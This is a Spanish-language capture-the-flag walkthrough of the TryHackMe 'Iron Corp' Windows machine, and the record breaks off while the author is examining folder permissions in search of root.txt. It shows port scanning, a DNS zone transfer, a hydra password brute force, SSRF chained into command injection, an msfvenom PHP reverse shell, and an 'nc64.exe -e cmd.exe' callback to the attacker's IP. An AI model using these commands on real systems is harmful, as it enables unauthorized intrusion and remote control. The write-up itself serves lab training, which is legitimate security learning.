## TryHackMe  <> Iron Corp

![image](https://github.com/Esevka/CTF/assets/139042999/6e477e99-6b23-4487-a9e6-3605cee8f126)

Enlace Maquina: https://tryhackme.com/room/ironcorp

Enunciado : 

  - Edit your config file and add ironcorp.me
  - Conseguir Flags(user.txt y root.txt)
---

## Escaneo de puertos (NMAP).

-Buscamos puertos abiertos en en la maquina victima.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/iron_corp/nmap]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.27.190 -vvv -oG open_ports
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 06:29 CET
    Initiating SYN Stealth Scan at 06:29
    
    PORT      STATE SERVICE       REASON
    53/tcp    open  domain        syn-ack ttl 127
    135/tcp   open  msrpc         syn-ack ttl 127
    3389/tcp  open  ms-wbt-server syn-ack ttl 127
    8080/tcp  open  http-proxy    syn-ack ttl 127
    11025/tcp open  unknown       syn-ack ttl 127
    49667/tcp open  unknown       syn-ack ttl 127
    49670/tcp open  unknown       syn-ack ttl 127

-Extraemos los puertos de la captura anterior para lanzarles unos scripts basicos de reconocimiento.

  Utilizamos un Script en bash simple pero de gran ayuda. Script-->  https://github.com/Esevka/CTF/tree/main/Bash

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/iron_corp/nmap]
    └─# list_port open_ports 
    
    [+]Puertos Disponibles --> (Copiados en el Clipboard)
    
    53,135,3389,8080,11025,49667,49670 

-Lanzamos scripts basicos de reconocimiento sobre los puertos abiertos.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/iron_corp/nmap]
    └─# nmap -p 53,135,3389,8080,11025,49667,49670 -sCV -n -Pn 10.10.27.190 -oN info_ports
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 06:33 CET
    
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    135/tcp   open  msrpc         Microsoft Windows RPC
    3389/tcp  open  ms-wbt-server Microsoft Terminal Services
    | rdp-ntlm-info: 
    |   Target_Name: WIN-8VMBKF3G815
    |   NetBIOS_Domain_Name: WIN-8VMBKF3G815
    |   NetBIOS_Computer_Name: WIN-8VMBKF3G815
    |   DNS_Domain_Name: WIN-8VMBKF3G815
    |   DNS_Computer_Name: WIN-8VMBKF3G815
    |   Product_Version: 10.0.14393
    |_  System_Time: 2023-11-04T05:34:47+00:00
    | ssl-cert: Subject: commonName=WIN-8VMBKF3G815
    | Not valid before: 2023-11-03T05:22:29
    |_Not valid after:  2024-05-04T05:22:29
    |_ssl-date: 2023-11-04T05:34:54+00:00; 0s from scanner time.
    8080/tcp  open  http          Microsoft IIS httpd 10.0
    |_http-server-header: Microsoft-IIS/10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent
    11025/tcp open  http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4)
    |_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
    |_http-title: Coming Soon - Start Bootstrap Theme
    | http-methods: 
    |_  Potentially risky methods: TRACE
    49667/tcp open  msrpc         Microsoft Windows RPC
    49670/tcp open  msrpc         Microsoft Windows RPC
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

  ---
## Analizamos la informacion obtenida.

-Anadimos ironcorp.me a nuestro fichero /etc/hosts como nos dice el enunciado.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/iron_corp/nmap]
    └─# cat /etc/hosts                                                   
    127.0.0.1       localhost
    127.0.1.1       kali
    10.10.27.190    ironcorp.me

--Tenemos dos puertos en los que estan corriendo servicios http (8080,11025)

  - Puerto (8080)
    
    Encontramos que tenemos corriendo -> Dashtreme Admin
    Tras analizar la web, realizar fuzzing con gobuster y buscar la existencia de algun exploit no encontramos nada interesante.

    ![image](https://github.com/Esevka/CTF/assets/139042999/4bf944e5-caa8-41fa-8366-3f837007bf64)

  - Puerto (11025)

    Encontramos una web en construccion, indica que proximamente estara disponible poco mas.
    Tras analizar la web, realizar fuzzing con gobuster y buscar algo que nos pueda ayudar no encontramos nada.

    ![image](https://github.com/Esevka/CTF/assets/139042999/2e1c09c9-6b98-4db8-a81b-47698bb6ec8b)


--LLegados a este punto podriamos mirar la existencia de subdominios, el enuncionado hace incapie en que nuestro /etc/hosts contenga la resolucion al nombre de host -> ironcorp.me

  - Obtencion de subdominios mediante fuerza bruta con wfuzz.

    - Lanzamos el comando al puerto 8080, no tenemos resultados.
    
    - Sin embargo lanzamos el mismo comando al puerto 11025 y obtenemos dos posibles subdominios.

          ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/iron_corp]
          └─# wfuzz -u http://ironcorp.me:11025 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "HOST: FUZZ.ironcorp.me" --hw 199 
          
          ********************************************************
          * Wfuzz 3.1.0 - The Web Fuzzer                         *
          ********************************************************
          
          Target: http://ironcorp.me:11025/
          Total requests: 4989
          =====================================================================
          ID           Response   Lines    Word       Chars       Payload                                                                     
          =====================================================================
          000000024:   401        47 L     132 W      1305 Ch     "admin - admin"                                                             
          000000387:   403        42 L     98 W       1086 Ch     "internal - internal"                                                       

  - Obtencion de subdominios mediante transferencia de zona DNS.

    Puerto 53(open) domain Simple DNS Plus (La maquina tiene un servidor DNS Corriendo)

        QUE ES AXFR?
    
        El comando "dig axfr" se utiliza para realizar una transferencia de zona (Zone Transfer) desde un servidor DNS.
        La transferencia de zona es un proceso mediante el cual un servidor DNS obtiene una copia completa de la base de datos de zona de otro servidor DNS.
        Esto puede ser útil para mantener copias de seguridad de la configuración de zona de un dominio o para replicar la información de zona entre servidores DNS autorizados.
    
        En resumen, el comando "dig axfr @<DNS_IP> <DOMAIN>" se utiliza para solicitar una transferencia de zona completa desde un servidor DNS específico para un dominio dado.
        Es importante tener en cuenta que no todos los servidores DNS permiten transferencias de zona a cualquier persona;
        generalmente, solo los servidores autorizados para el dominio en cuestión permitirán esta operación por razones de seguridad.

    Probamos a realizar una transferencia de zona y obtenemos los dos mismos subdominios que mediante fuerza bruta, estos apuntan al localhost de la maquina victima. 

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/iron_corp]
        └─# dig axfr @10.10.125.93 ironcorp.me
        
        ; <<>> DiG 9.18.16-1-Debian <<>> axfr @10.10.125.93 ironcorp.me
        ; (1 server found)
        ;; global options: +cmd
        ironcorp.me.            3600    IN      SOA     win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
        ironcorp.me.            3600    IN      NS      win-8vmbkf3g815.
        admin.ironcorp.me.      3600    IN      A       127.0.0.1
        internal.ironcorp.me.   3600    IN      A       127.0.0.1
        ironcorp.me.            3600    IN      SOA     win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
        ;; Query time: 67 msec
        ;; SERVER: 10.10.125.93#53(10.10.125.93) (TCP)
        ;; WHEN: Sat Nov 04 07:47:36 CET 2023
        ;; XFR size: 5 records (messages 1, bytes 238)


## Analizamos los subdominios encontrados.

--Por el momento tenemos:

    Dominio ------> ironcorp.me 
    Subdominios --> admin.ironcorp.me -- internal.ironcorp.me

  Anadimos los subdominios encontrados a nuestro fichero /etc/hosts

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/iron_corp]
    └─# cat /etc/hosts
    10.10.125.93    ironcorp.me admin.ironcorp.me internal.ironcorp.me


--Vamos a ver que continen estos subdominios.

  - Cargamos los subdominios en el puerto 80, no conseguimos nada.

  - Cargamos el subdominio internal.ironcorp.me
      - Puerto 8080 ---> Muestra el panel Dashtreme Admin , nada interesante lo mismo.
      - Puerto 11025 --> Muestra un  Access forbidden! Error 403
    
  - Cargamos el subdominio admin.ironcorp.me
      - Puerto 8080 ---> Muestra el panel Dashtreme Admin , nada interesante lo mismo.
      - Puerto 11025 --> Muestra un panel de autenticacion basica de Apache(este puerto corre un  servicio Apache httpd 2.4.41)
        
        ![image](https://github.com/Esevka/CTF/assets/139042999/22d2d26b-7248-446d-b002-ca1071e8786d)

        Info: Autenticacion Basica en Apache.
        https://www.zeppelinux.es/autenticacion-basic-en-apache/#google_vignette
        
        Ataque fuerza bruta contra Apache(Autenticacion Basica).
        Para el ataque utilizaremos la herramienta hydra y unos diccionarios de usuarios y passwords de seclist, probaremos suerte.

            ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/iron_corp]
            └─# hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt "admin.ironcorp.me" -s 11025 http-get -f -V 
            Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes
            
            Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-04 08:34:09
            [WARNING] You must supply the web page as an additional option or via -m, default path set to /
            [DATA] max 16 tasks per 1 server, overall 16 tasks, 17833 login tries (l:17/p:1049), ~1115 tries per task
            [DATA] attacking http-get://admin.ironcorp.me:11025/
            [ATTEMPT] target admin.ironcorp.me - login "root" - pass "------" - 1 of 17833 [child 0] (0/0)
            [ATTEMPT] target admin.ironcorp.me - login "root" - pass "0" - 2 of 17833 [child 1] (0/0)
            [.......]
            [ATTEMPT] target admin.ironcorp.me - login "admin" - pass "print" - 1805 of 17833 [child 12] (0/0)
            [ATTEMPT] target admin.ironcorp.me - login "admin" - pass "private" - 1806 of 17833 [child 10] (0/0)
            [11025][http-get] host: admin.ironcorp.me   login: admin   password: password123
            [STATUS] attack finished for admin.ironcorp.me (valid pair found)
            1 of 1 target successfully completed, 1 valid password found
            Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-04 08:35:01
        
        Despues de un minuto obtenemos credenciales validas para nuestro panel ---> admin:password123

## Obtenemos acceso al panel del subdominio admin.

Nos logueamos con las credenciales validas y obtenemos acceso a una web que nos permite realizar consultas(no sabemos de que tipo)

![image](https://github.com/Esevka/CTF/assets/139042999/ad3cb8e7-e031-4a89-8f2b-e3f3a6df74e1)

--Probamos a realizar multiples consultas para ver como funciona esto.

- Enviamos un string y obtenemos lo siguiente.

  La almohadilla en final de la url me llama la atencion.

  ![image](https://github.com/Esevka/CTF/assets/139042999/0ea9c3ed-40c5-42fb-804b-3080d3222256)

  NOTA:
  
      El símbolo "#" en una URL generalmente se utiliza para marcar una parte específica de una página web, lo que se conoce como "fragmento".
      Los fragmentos se utilizan para señalar una ubicación específica en una página web, y cuando alguien accede a la URL con el fragmento,
      el navegador web buscará ese fragmento en la página y si está presente se desplazará automáticamente hasta esa parte de la página.
    
      Si tienes una URL como "http://ejemplo.com/pagina#", al acceder a esa URL, el navegador cargará la página "pagina" en "ejemplo.com",
      pero no realizará ningún desplazamiento automático ni realizará ninguna acción basada en el fragmento,
      ya que no se especifica un fragmento concreto después de la almohadilla.

  Por lo que esto nos da a entender, que podriamos intentar cargar una url en la query y ver si nos muestra su contenido.

- Vamos a pasarle como parametro 'r' -->  internal.ironcorp.me:11025  que nos mostraba un  Access forbidden! Error 403, BINGO!

  ![image](https://github.com/Esevka/CTF/assets/139042999/65a220b1-3cbb-41ce-ba08-d27c92495f43)

  ![image](https://github.com/Esevka/CTF/assets/139042999/daab1b80-b557-43a7-b23c-94650e61704b)

	Cargamos la url encontrada, nuevamente obtenemos un ---> Access forbidden! Error 403.

- Le pasamos como parametro 'r' la nueva url encontrada.

  Nos muestra como mensaje el nombre Equinox, que tras probar a pasarle al parametro 'name' un string vemos que lo concatena al nombre quedando 'Equinoxesevka'

  ![image](https://github.com/Esevka/CTF/assets/139042999/0e4b34d1-21ec-451b-8d56-9bffbb597db6)
  ![image](https://github.com/Esevka/CTF/assets/139042999/76e8cf96-41a2-44cb-a817-857b8314ccc4)


## Ejecutamos codigo en la maquina victima.

  - Probamos con PHP Wrappers para ver si podiamos ver el contenido de name.php ---> sin exito.

  	Lo unico que conseguimos:

		 Notice:  Undefined index: name in E:\xampp\htdocs\internal\name.php on line 8

  - Despues de mucho probar y fallar y volver a fallar nos paramos a pensar un poco:

	- Mediante un subdominio llamado 'admin' estamos haciendo consultas a otro subdominio 'internal', vulnerabilidad  ---> SSRF.
 	- Este subdominio 'internal' sabemos que tiene un fichero name.php el cual acepta valores a traves de  una variable 'name'
  	- Si ejecutamos la url sin pasar nada a la variable 'name', esta nos muestra el nombre de 'Equinox' (Posible usuario)
  	- Si ejecutamos la url pasandole algun valor a la variable 'name', esta nos muestra el nombre de 'Equinox' concatenando el valor, EJ: EquinoxEsevka

  - Por intentar algo diferente pensamos que el codigo de name.php podria ser algo parecido a esto, despues de tantas pruebas y fallos.
    
  	 	<?php
    		$name = "echo Equinox".$_GET['name'];
		system($name);
		?> 
 
  	 - Podriamos intentar romperlo mediante la ejecucion de comandos windows, utilizando la concatenacion o redireccion de comandos.


		    &: Se utiliza para concatenar múltiples comandos en una sola línea.

		    >: Redirecciona la salida estándar de un comando a un archivo y sobrescribe el archivo existente.
		
		    >>: Redirecciona la salida estándar de un comando a un archivo y agrega el contenido al final del archivo existente sin sobrescribirlo.
		
		    <: Redirecciona la entrada de un comando desde un archivo en lugar de la entrada estándar.
		
		    |: Conocido como "pipe", conecta la salida de un comando a la entrada de otro.
		
		    &&: Ejecuta el segundo comando solo si el primero se ejecuta exitosamente (sin errores).
		
		    ||: Ejecuta el segundo comando solo si el primero no se ejecuta exitosamente (con errores).
		
		    &>: Redirecciona tanto la salida estándar como la salida de error a un archivo.
		
		    2>: Redirecciona la salida de error estándar a un archivo.
		
		    2>>: Redirecciona la salida de error estándar a un archivo y agrega el contenido al final del archivo existente sin sobrescribirlo.
      
  - Conseguimos ejecutar codigo en la maquina.

    ![image](https://github.com/Esevka/CTF/assets/139042999/0003eff4-e693-4d3b-bd0d-f8d21db4d8f8)

  - Lo primero vamos a visualizar el contenido de name.php para ver su codigo.

    - Primer problema, cuando mandamos por ejemplo esto , nos devuelve un response indicando ---> Bad request!

		![image](https://github.com/Esevka/CTF/assets/139042999/b70df2c7-e004-40ca-baf5-7f557c69f642)

    	Creo que es por temas de los espacios entre comandos aun estando url encode con el simbolo + o el con %20 da el mismo error, ya que si ejecutamos por ejemplo el comando dir funciona.
    
    - Sabemos que se puede hacer url encode multiples veces, por lo que vamos a volver a url encodear el simbolo + y probamos.
   
      ![image](https://github.com/Esevka/CTF/assets/139042999/6755c76a-3363-48ae-b811-0a72b34cf1c3)

      Funciona y el codigo php es similar al que pensamos que podria ser.


## Obtenemos Consola en la maquina victima

Hemos conseguido ejecutar comandos a nivel de sistema en la maquina victima, por lo que la subida de ficheros a esta la realizaremos con el comando 'certutil'

1)Creamos una reverse shell php 

	┌──(root㉿kali)-[/home/…/ctf/try_ctf/iron_corp/contenido]
	└─# msfvenom -p php/reverse_php LHOST=10.9.92.151 LPORT=1988 -o rshell.php
	[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
	[-] No arch selected, selecting arch: php from the payload
	No encoder specified, outputting raw payload
	Payload size: 3022 bytes
	Saved as: rshell.php
 
2)Subimos rshell.php a la maquina victima con ayuda de burpsuite, necesitamos montar un server http para compartir rshell.php

![image](https://github.com/Esevka/CTF/assets/139042999/dc669435-519b-4613-aefa-a9dac5109023)

3)Ejecutamos rshell.php

![image](https://github.com/Esevka/CTF/assets/139042999/b80e0916-601a-4fa8-9f12-622d088154a5)

Obtenemos acceso a la maquina como  --> '''nt authority\system''' , ya podemos hacer lo que nos venga en gana.

4)Vamos a subir a la maquina netcat para establecer una conexion mas estable, subiremos netcat del mismo modo que rshell.php

nc64.exe --> https://github.com/int0x33/nc.exe/


	┌──(root㉿kali)-[/home/…/ctf/try_ctf/iron_corp/contenido]
	└─# rlwrap nc -lvnp 1988
	listening on [any] 1988 ...
	connect to [10.9.92.151] from (UNKNOWN) [10.10.80.141] 50302
	nc64.exe -e cmd.exe 10.9.92.151 2000

![image](https://github.com/Esevka/CTF/assets/139042999/48191d62-a9cd-4f27-ab30-3a355212f117)

## Obtenemos Flags

Cuando obtenemos consola en la maquina si nos fijamos la unidad es la E:\ , que es donde se encuentra montado toda la web a nosotros en estos momentos nos interesa C:\

- Desde la consola(Simbolo del sistema,cmd.exe) no nos permite realizar el cambio a C:\ por lo que vamos a intentarlo desde powershell.
  
		┌──(root㉿kali)-[/home/…/ctf/try_ctf/iron_corp/contenido]
		└─# rlwrap nc -lvnp 2000
		listening on [any] 2000 ...
		connect to [10.9.92.151] from (UNKNOWN) [10.10.80.141] 50320
		Microsoft Windows [Version 10.0.14393]
		(c) 2016 Microsoft Corporation. All rights reserved.
		
		E:\xampp\htdocs\internal>cd c:
		cd c:
		E:\xampp\htdocs\internal>powershell
		powershell
		Windows PowerShell 
		Copyright (C) 2016 Microsoft Corporation. All rights reserved.
		
		PS E:\xampp\htdocs\internal>cd c:\
		cd c:\
		PS C:\>
  
- Leemos flag user.txt

		PS C:\users\Administrator\Desktop> type user.txt
		type user.txt
		thm{09b408056a1----------33e6e4cf599f8c}

- Leemos flag root.txt

  A la hora de buscar root.txt, encontramos con que no podemos acceder por temas de permisos a las carpetas de dos de los usuarios del sistema(Admin y SuperAdmin).

  1)Usuario SuperAdmin

		PS C:\users\SuperAdmin> Get-acl |Format-list
		Get-acl |Format-list
		
		Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\SuperAdmin
		Owner  : NT AUTHORITY\SYSTEM
		Group  : NT AUTHORITY\SYSTEM
		Access : BUILTIN\Administrators Deny  FullControl
		         S-1-5-21-297466380-2647629429-287235700-1000 Allow  FullControl
		Audit  : 
		Sddl   : O:SYG:SYD:PAI(D;OICI;FA;;;BA)(A;OICI;FA;;;S-1-5-21-297466380-264762942
		         9-287235700-1000)
		
	Como vemos no tenemos acceso al directorio ya que pertenecemos al grupo el cual le deniega el acceso.
 	Solo tiene acceso total el usuario con el SID que se muestra, listamos los SID de usuarios para ver si podemos hacer algo.
	Nada creo que dicho usuario no existe  ya que no coincide con ningun SID

		PS C:\users\SuperAdmin> wmic useraccount get name,sid
		wmic useraccount get name,sid
		Name            SID                                           
		Admin           S-1-5-21-297466380-2647629429-287235700-1003  
		Administrator   S-1-5-21-297466380-2647629429-287235700-500   
		DefaultAccount  S-1-5-21-297466380-2647629429-287235700-503   
		Equinox         S-1-5-21-297466380-2647629429-287235700-1001  
		Guest           S-1-5-21-297466380-2647629429-287235700-501   
		Sunlight        S-1-5-21-297466380-2647629429-287235700-1002 
	
  


















    	

    
      
  



  

  

    



        



    







